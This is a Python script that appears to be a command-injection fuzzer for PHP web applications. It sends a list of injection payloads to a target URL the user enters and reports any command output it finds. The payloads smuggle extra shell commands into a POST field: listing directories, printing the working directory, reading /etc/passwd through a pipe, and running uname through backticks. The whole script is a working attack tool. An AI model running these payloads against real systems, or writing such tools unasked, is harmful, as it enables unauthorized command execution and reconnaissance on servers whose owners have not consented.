import requests

def send_post_request(url, payload):
    try:
        data = {'command': payload}
        response = requests.post(url, data=data)
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"Error occurred during HTTP request: {e}")
        return None

def run_fuzzer(target_url, payloads):
    print("<style>pre { background-color: #f4f4f4; padding: 10px; border: 1px solid #ccc; }</style>")
    print("<h1>Command Fuzzer Results</h1>")
    print("<hr>")
    
    for payload in payloads:
        print(f"<h2>Testing payload: '{payload}' ...</h2>")
        response = send_post_request(target_url, payload)
        
        if response is not None:
            command_output = extract_command_output(response)
            if command_output:
                print(f"<p>Payload '{payload}' executed successfully!</p>")
                print("<p>Command output:</p>")
                print(f"<pre>{command_output}</pre>")
            else:
                print(f"<p>Payload '{payload}' did not execute as expected.</p>")
        else:
            print(f"<p>Payload '{payload}' failed to execute due to HTTP request error.</p>")

        print("<hr>")

def extract_command_output(response):
    start_index = response.find('<pre>')
    end_index = response.find('</pre>', start_index)
    if start_index != -1 and end_index != -1:
        command_output = response[start_index + len('<pre>'):end_index]
        return command_output.strip()
    return None

if __name__ == "__main__":
    target_url = input("Enter the target URL of the PHP application: ")

    payloads = [
        'echo',
        'echo ;ls -la',
        'echo && pwd',
        'echo | cat /etc/passwd',
        '`echo uname -a`',
        'invalid-command',
    ]

    run_fuzzer(target_url, payloads)
